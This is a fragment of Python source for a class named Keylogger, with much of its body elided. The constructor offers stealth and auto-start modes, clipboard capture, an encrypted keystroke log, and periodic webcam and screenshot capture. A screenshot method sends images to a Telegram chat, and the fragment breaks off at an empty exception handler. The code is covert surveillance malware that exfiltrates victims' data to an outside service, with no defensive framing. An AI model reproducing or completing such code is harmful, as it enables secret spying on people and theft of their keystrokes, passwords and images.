...
class Keylogger:
    ...
    def __init__(self, api_token=None, chat_id=None, enable_clipboard=False, log_file="keylog.enc", encryption_key=None, auto_start=False, stealth_mode=False, enable_webcam=False, enable_screenshot=False, webcam_interval=60, screenshot_interval=60):
    ...
    def capture_screenshot(self):
        try:
            ...
            if self.telegram_available and self.api_token and self.chat_id:
                self.loop.call_soon_threadsafe(asyncio.ensure_future, self.send_image_to_telegram(filename))
        except Exception as e:
